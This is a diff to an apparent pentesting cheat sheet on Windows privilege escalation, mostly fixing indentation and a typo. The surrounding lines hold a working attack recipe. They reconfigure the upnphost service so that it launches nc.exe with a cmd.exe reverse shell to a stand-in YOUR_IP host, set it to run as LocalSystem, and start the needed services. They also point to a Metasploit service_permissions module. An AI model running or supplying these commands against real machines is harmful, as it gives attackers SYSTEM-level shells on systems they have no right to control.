@@ -244,19 +244,19 @@ $ net users Administrator
 		* WIndows SP0 or SP1 == good chance
 	```
 	$ sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe YOUR_IP 1234 -e C:\WINDOWS\System32\cmd.exe"
-	sc config upnphost obj= ".\LocalSystem" password= ""
-	sc qc upnphost
+	$ sc config upnphost obj= ".\LocalSystem" password= ""
+	$ sc qc upnphost
 	```
-		* If it failes because of a missing dependency, run the following: 
-		```
-		$ sc config SSDPSRV start= auto
-		net start SSDPSRV
-		net start upnphost
-		```
-		* OR remove the dependency
-		```
-		> exploit/windows/local/service_permissions
-		```
+	* If it fails because of a missing dependency, run the following: 
+	```
+	$ sc config SSDPSRV start= auto
+	net start SSDPSRV
+	net start upnphost
+	```
+	** OR remove the dependency
+	```
+	> exploit/windows/local/service_permissions
+	```
 	* Can also use accesschk.exe
 - powershell
 	* check for powershell
